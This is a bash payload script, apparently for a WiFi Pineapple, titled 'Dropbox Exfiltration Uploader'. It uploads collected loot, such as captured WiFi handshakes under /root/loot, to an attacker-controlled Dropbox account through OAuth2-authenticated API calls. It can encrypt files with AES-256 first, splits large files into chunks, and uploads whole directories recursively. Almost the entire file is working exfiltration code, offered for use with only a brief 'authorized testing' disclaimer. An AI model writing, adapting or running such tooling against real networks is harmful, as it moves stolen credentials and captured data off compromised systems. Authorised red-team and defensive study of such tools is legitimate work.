#!/bin/bash
# Title: Dropbox Exfiltration Uploader
# Description: Upload collected data to Dropbox with OAuth2 authentication
# Author: macr0hack422
# Version: 1.0
# Category: Exfiltration
#
# This payload provides secure data exfiltration to Dropbox using the official
# Dropbox API v2 with OAuth2 authentication. Files are uploaded to a specific
# folder in the user's Dropbox account.
#
# Features:
# - OAuth2 authentication flow (with app folder access for security)
# - Automatic token refresh handling
# - Chunked uploads for large files (>150MB)
# - Directory upload support (recursive)
# - Optional AES-256 encryption before upload
# - Upload progress tracking
# - Upload history and session logging
# - Conflict resolution (rename/overwrite/skip)
#
# SETUP INSTRUCTIONS:
# 1. Create a Dropbox app at: https://www.dropbox.com/developers/apps
#    - Select "Scoped App" (not Dropbox API)
#    - Choose "App Folder" access for security (recommended)
#    - Enable the following scopes:
#      * files.content.write
#      * files.content.read
# 2. Note your App Key and App Secret
# 3. Generate an access token using the authorize function in this script
# 4. Save the token for future use
#
# IMPORTANT: For authorized security testing only.
# Never hardcode access tokens in payloads.

# ============================================
# CONFIGURATION
# ============================================

UPLOAD_DIR="/root/loot/dropbox_exfil"
TOKEN_FILE="$UPLOAD_DIR/.dropbox_token"
SESSION_LOG="$UPLOAD_DIR/upload_sessions.log"
CONFIG_FILE="$UPLOAD_DIR/config.conf"

# Dropbox API endpoints
API_BASE="https://api.dropboxapi.com"
CONTENT_BASE="https://content.dropboxapi.com"
AUTH_URL="https://www.dropbox.com/oauth2/authorize"
TOKEN_URL="https://api.dropboxapi.com/oauth2/token"

# Upload settings
CHUNK_SIZE=10485760       # 10MB chunks (Dropbox recommends 8-16MB)
MAX_SINGLE_SIZE=157286400 # 150MB (above this requires chunked upload)
DROPBOX_PATH="/Pineapple"  # Path in app folder

# Encryption
ENCRYPTION_KEY=""
ENCRYPTION_ALGO="aes-256-cbc"

# ============================================
# INITIALIZATION
# ============================================

mkdir -p "$UPLOAD_DIR"

# ============================================
# AUTHENTICATION
# ============================================

# Save access token
save_token() {
    local access_token="$1"
    local refresh_token="$2"
    local expires_in="$3"

    local expiry_time
    expiry_time=$(($(date +%s) + expires_in - 300))  # Refresh 5 min early

    cat > "$TOKEN_FILE" <<EOF
ACCESS_TOKEN="$access_token"
REFRESH_TOKEN="$refresh_token"
EXPIRES_AT="$expiry_time"
EOF

    chmod 600 "$TOKEN_FILE"
}

# Load saved token
load_token() {
    if [ ! -f "$TOKEN_FILE" ]; then
        return 1
    fi

    source "$TOKEN_FILE"

    # Check if token needs refresh
    local now
    now=$(date +%s)

    if [ $now -ge $EXPIRES_AT ]; then
        LOG "Token expired, refreshing..."
        refresh_access_token
        source "$TOKEN_FILE"
    fi

    echo "$ACCESS_TOKEN"
    return 0
}

# Refresh access token using refresh token
refresh_access_token() {
    if [ ! -f "$TOKEN_FILE" ]; then
        return 1
    fi

    source "$TOKEN_FILE"

    # Note: Dropbox refresh tokens require app with appropriate permissions
    # This is a placeholder - actual implementation depends on app type
    LOG yellow "Token refresh - please re-authorize"
    return 1
}

# Get authorization URL (manual flow for headless devices)
get_auth_url() {
    local app_key="$1"

    local redirect_uri="http://localhost:8080"  # Dropbox doesn't use this for manual flow

    echo "${AUTH_URL}?client_id=${app_key}&response_type=code&token_access_type=offline"
}

# Exchange authorization code for access token
exchange_code_for_token() {
    local app_key="$1"
    local app_secret="$2"
    local code="$3"

    local response
    response=$(curl -s -X POST "$TOKEN_URL" \
        -u "$app_key:$app_secret" \
        -d "code=$code" \
        -d "grant_type=authorization_code")

    local access_token
    access_token=$(echo "$response" | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

    if [ -n "$access_token" ]; then
        # Note: Refresh tokens only available for specific app types
        local refresh_token
        refresh_token=$(echo "$response" | grep -o '"refresh_token":"[^"]*' | cut -d'"' -f4)
        refresh_token="${refresh_token:-none}"

        local expires_in
        expires_in=$(echo "$response" | grep -o '"expires_in":[0-9]*' | cut -d':' -f2)
        expires_in="${expires_in:-14400}"  # Default 4 hours

        save_token "$access_token" "$refresh_token" "$expires_in"
        return 0
    else
        LOG red "Failed to get access token"
        LOG "Response: $response"
        return 1
    fi
}

# Check if token is valid
check_token() {
    local token="$1"

    local response
    response=$(curl -s -X POST "$API_BASE/2/check/user" \
        -H "Authorization: Bearer $token")

    if echo "$response" | grep -q '"result":"tag"'; then
        return 0
    else
        return 1
    fi
}

# ============================================
# ENCRYPTION (Optional)
# ============================================

# Encrypt file before upload
encrypt_file() {
    local input="$1"
    local output="$2"

    if [ -z "$ENCRYPTION_KEY" ]; then
        cp "$input" "$output"
        return 0
    fi

    if ! command -v openssl >/dev/null 2>&1; then
        LOG yellow "openssl not available, uploading unencrypted"
        cp "$input" "$output"
        return 0
    fi

    openssl enc -"$ENCRYPTION_ALGO" -salt -pbkdf2 -iter 100000 \
        -in "$input" -out "$output" \
        -pass env:ENCRYPTION_KEY 2>/dev/null

    return $?
}

# ============================================
# DROPBOX API OPERATIONS
# ============================================

# Upload small file (<150MB)
upload_file_simple() {
    local token="$1"
    local local_path="$2"
    local remote_path="$3"
    local mode="${4:-add}"  # add, overwrite, update

    local encrypted_file="/tmp/dropbox_upload_${SESSION_ID}.enc"

    # Encrypt if key is set
    if [ -n "$ENCRYPTION_KEY" ]; then
        LOG "Encrypting file..."
        if ! encrypt_file "$local_path" "$encrypted_file"; then
            LOG red "Encryption failed"
            return 1
        fi
        local_path="$encrypted_file"
    fi

    # Add .enc extension if encrypted
    [ -n "$ENCRYPTION_KEY" ] && remote_path="${remote_path}.enc"

    local response
    response=$(curl -s -X POST "$CONTENT_BASE/2/files/upload" \
        -H "Authorization: Bearer $token" \
        -H "Dropbox-API-Arg: {\"path\":\"$remote_path\",\"mode\":\"{\\\".tag\\\":\\\"$mode\\\"}\",\"autorename\":false}" \
        -H "Content-Type: application/octet-stream" \
        --data-binary "@$local_path")

    rm -f "$encrypted_file"

    if echo "$response" | grep -q '"name"'; then
        return 0
    else
        LOG red "Upload failed: $response"
        return 1
    fi
}

# Start chunked upload session
start_upload_session() {
    local token="$1"
    local local_path="$2"

    local encrypted_file="/tmp/dropbox_upload_${SESSION_ID}.enc"

    # Encrypt if needed
    if [ -n "$ENCRYPTION_KEY" ]; then
        encrypt_file "$local_path" "$encrypted_file" 2>/dev/null || return 1
        local_path="$encrypted_file"
    fi

    # Start session with first chunk
    local response
    response=$(head -c "$CHUNK_SIZE" "$local_path" | \
        curl -s -X POST "$CONTENT_BASE/2/files/upload_session/start" \
        -H "Authorization: Bearer $token" \
        -H "Content-Type: application/octet-stream" \
        --data-binary @-)

    local session_id
    session_id=$(echo "$response" | grep -o '"session_id":"[^"]*' | cut -d'"' -f4)

    rm -f "$encrypted_file"

    if [ -n "$session_id" ]; then
        echo "$session_id"
        return 0
    else
        return 1
    fi
}

# Append chunk to upload session
append_chunk() {
    local token="$1"
    local session_id="$2"
    local local_path="$3"
    local offset="$4"

    # Extract chunk
    local chunk
    chunk=$(tail -c +"$((offset + 1))" "$local_path" | head -c "$CHUNK_SIZE")

    local response
    response=$(echo -n "$chunk" | \
        curl -s -X POST "$CONTENT_BASE/2/files/upload_session/append_v2" \
        -H "Authorization: Bearer $token" \
        -H "Dropbox-API-Arg: {\"cursor\":{\"session_id\":\"$session_id\",\"offset\":$offset},\"close\":false}" \
        -H "Content-Type: application/octet-stream" \
        --data-binary @-)

    if ! echo "$response" | grep -q '"null"' && ! echo "$response" | grep -q '"result":null'; then
        LOG red "Chunk append failed: $response"
        return 1
    fi

    return 0
}

# Finish chunked upload
finish_upload_session() {
    local token="$1"
    local session_id="$2"
    local remote_path="$3"
    local local_path="$4"

    # Get file size for cursor
    local file_size
    file_size=$(stat -c%s "$local_path" 2>/dev/null || stat -f%z "$local_path" 2>/dev/null)

    [ -n "$ENCRYPTION_KEY" ] && remote_path="${remote_path}.enc"

    local response
    response=$(curl -s -X POST "$CONTENT_BASE/2/files/upload_session/finish" \
        -H "Authorization: Bearer $token" \
        -H "Dropbox-API-Arg: {\"cursor\":{\"session_id\":\"$session_id\",\"offset\":$file_size},\"commit\":{\"path\":\"$remote_path\",\"mode\":\"add\",\"autorename\":false}}" \
        -H "Content-Type: application/octet-stream" \
        --data-binary "")

    if echo "$response" | grep -q '"name"'; then
        return 0
    else
        LOG red "Finish upload failed: $response"
        return 1
    fi
}

# Upload file (auto-chunking)
upload_file() {
    local token="$1"
    local local_path="$2"
    local remote_path="$3"

    local file_size
    file_size=$(stat -c%s "$local_path" 2>/dev/null || stat -f%z "$local_path" 2>/dev/null)

    LOG "Uploading: $(basename "$local_path") ($file_size bytes)"

    if [ $file_size -le $MAX_SINGLE_SIZE ]; then
        # Simple upload
        upload_file_simple "$token" "$local_path" "$remote_path"
        return $?
    else
        # Chunked upload
        LOG "Large file, using chunked upload..."

        local session_id
        session_id=$(start_upload_session "$token" "$local_path") || return 1

        # Upload remaining chunks
        local offset=$CHUNK_SIZE
        local chunk_num=1
        local total_chunks=$(((file_size + CHUNK_SIZE - 1) / CHUNK_SIZE))

        while [ $offset -lt $file_size ]; do
            LOG "Uploading chunk $chunk_num/$total_chunks..."

            if ! append_chunk "$token" "$session_id" "$local_path" "$offset"; then
                return 1
            fi

            offset=$((offset + CHUNK_SIZE))
            chunk_num=$((chunk_num + 1))
        done

        # Finish upload
        finish_upload_session "$token" "$session_id" "$remote_path" "$local_path"
        return $?
    fi
}

# Upload directory recursively
upload_directory() {
    local token="$1"
    local local_dir="$2"
    local remote_dir="$3"

    LOG "Uploading directory: $(basename "$local_dir")"

    local file_count=0
    local success_count=0

    while IFS= read -r -d '' file; do
        file_count=$((file_count + 1))

        local rel_path
        rel_path="${file#$local_dir}"
        rel_path="${rel_path#/}"

        local remote_path="$remote_dir/$rel_path"

        if upload_file "$token" "$file" "$remote_path"; then
            success_count=$((success_count + 1))
            LOG green "  ✓ $(basename "$file")"
        else
            LOG red "  ✗ $(basename "$file")"
        fi
    done < <(find "$local_dir" -type f -print0)

    LOG ""
    LOG "Directory upload complete: $success_count/$file_count files"

    return 0
}

# Create Dropbox folder
create_folder() {
    local token="$1"
    local path="$2"

    curl -s -X POST "$API_BASE/2/files/create_folder_v2" \
        -H "Authorization: Bearer $token" \
        -H "Content-Type: application/json" \
        -d "{\"path\":\"$path\",\"autorename\":false}" >/dev/null 2>&1
}

# ============================================
# MAIN FUNCTIONS
# ============================================

# Get source to upload
get_source() {
    LOG ""
    LOG "Select source:"
    LOG "  [1] Handshakes directory"
    LOG "  [2] Loot directory"
    LOG "  [3] Custom file"
    LOG "  [4] Custom directory"
    LOG ""

    local choice
    choice=$(NUMBER_PICKER "Source" 1 4 1)

    case "$choice" in
        1) echo "/root/loot/handshakes" ;;
        2) echo "/root/loot" ;;
        3)
            local path
            path=$(TEXT_PICKER "File Path" "/root/loot/data.txt")
            echo "$path"
            ;;
        4)
            local path
            path=$(TEXT_PICKER "Directory Path" "/root/loot")
            echo "$path"
            ;;
    esac
}

# Main upload routine
main_upload() {
    local token="$1"
    local source="$2"
    local remote_folder="${3:-$DROPBOX_PATH}"

    SESSION_ID=$(date '+%Y%m%d%H%M%S')

    LOG ""
    LOG "╔════════════════════════════════════════╗"
    LOG "║   DROPBOX UPLOAD                      ║"
    LOG "╚════════════════════════════════════════╝"
    LOG ""
    LOG "Source: $source"
    LOG "Destination: $remote_folder"
    LOG ""

    # Verify source exists
    if [ ! -e "$source" ]; then
        ERROR_DIALOG "Source not found"
        return 1
    fi

    # Ensure remote folder exists
    create_folder "$token" "$remote_folder" 2>/dev/null

    # Upload
    if [ -f "$source" ]; then
        local filename
        filename=$(basename "$source")
        upload_file "$token" "$source" "$remote_folder/$filename"
    elif [ -d "$source" ]; then
        local dirname
        dirname=$(basename "$source")
        upload_directory "$token" "$source" "$remote_folder/$dirname"
    fi

    local result=$?

    # Log session
    {
        echo "[$(date -Iseconds)] Source: $source"
        echo "  Destination: $remote_folder"
        echo "  Result: $([ $result -eq 0 ] && echo 'SUCCESS' || echo 'FAILED')"
        echo ""
    } >> "$SESSION_LOG"

    return $result
}

# ============================================
# MAIN MENU
# ============================================

main_menu() {
    while true; do
        clear
        LOG ""
        LOG green "╔════════════════════════════════════════╗"
        LOG green "║   DROPBOX EXFILTRATION v1.0          ║"
        LOG green "║   Author: macr0hack422               ║"
        LOG green "╚════════════════════════════════════════╝"
        LOG ""

        # Check for saved token
        if [ -f "$TOKEN_FILE" ]; then
            LOG green "[✓] Token configured"
        else
            LOG yellow "[!] No token found - configure first"
        fi

        LOG ""
        LOG "Options:"
        LOG "  [UP]    Upload files/folders"
        LOG "  [DOWN]  Configure authentication"
        LOG "  [LEFT]  Set encryption key"
        LOG "  [RIGHT] View upload log"
        LOG "  [B]     Exit"
        LOG ""

        local btn
        btn=$(WAIT_FOR_INPUT)

        case "$btn" in
            UP)
                local token
                token=$(load_token)

                if [ $? -ne 0 ]; then
                    ERROR_DIALOG "Not authenticated"
                    continue
                fi

                if ! check_token "$token"; then
                    ERROR_DIALOG "Token invalid"
                    continue
                fi

                local source
                source=$(get_source)

                if [ -n "$source" ]; then
                    main_upload "$token" "$source"
                    RINGTONE "success" &
                fi

                PROMPT "Press any key to continue..."
                ;;
            DOWN)
                LOG ""
                LOG "Authentication Setup"
                LOG "────────────────────"
                LOG ""
                LOG "1. Create a Dropbox app at:"
                LOG "   https://www.dropbox.com/developers/apps"
                LOG ""
                LOG "2. Select 'Scoped App' → 'App Folder'"
                LOG ""
                LOG "3. Enable scopes:"
                LOG "   files.content.write"
                LOG "   files.content.read"
                LOG ""
                LOG "4. Enter your App Key:"

                local app_key
                app_key=$(TEXT_PICKER "App Key" "")

                if [ -z "$app_key" ]; then
                    continue
                fi

                LOG "App Secret:"
                local app_secret
                app_secret=$(TEXT_PICKER "App Secret" "")

                if [ -z "$app_secret" ]; then
                    continue
                fi

                # Generate auth URL
                local auth_url
                auth_url=$(get_auth_url "$app_key")

                LOG ""
                LOG "╔════════════════════════════════════════╗"
                LOG "║   AUTHORIZATION REQUIRED              ║"
                LOG "╚════════════════════════════════════════╝"
                LOG ""
                LOG "Visit this URL to authorize:"
                LOG "$auth_url"
                LOG ""
                LOG "After authorizing, you'll be redirected to a"
                LOG "page that shows a code. Enter that code:"

                local auth_code
                auth_code=$(TEXT_PICKER "Authorization Code" "")

                if [ -n "$auth_code" ]; then
                    if exchange_code_for_token "$app_key" "$app_secret" "$auth_code"; then
                        LOG green "Authentication successful!"
                        sleep 2
                    else
                        LOG red "Authentication failed"
                        sleep 2
                    fi
                fi
                ;;
            LEFT)
                LOG ""
                LOG "Enter encryption key (leave empty to disable):"
                local new_key
                new_key=$(TEXT_PICKER "Encryption Key" "")

                if [ -n "$new_key" ]; then
                    ENCRYPTION_KEY="$new_key"
                    LOG green "Encryption enabled"
                else
                    ENCRYPTION_KEY=""
                    LOG yellow "Encryption disabled"
                fi
                sleep 1
                ;;
            RIGHT)
                clear
                LOG ""
                LOG "Upload History"
                LOG "──────────────"
                LOG ""

                if [ -f "$SESSION_LOG" ]; then
                    tail -20 "$SESSION_LOG"
                else
                    LOG "No upload history"
                fi

                PROMPT "Press any key to continue..."
                ;;
            B)
                LOG ""
                LOG "Exiting..."
                exit 0
                ;;
        esac
    done
}

# ============================================
# START
# ============================================

main_menu
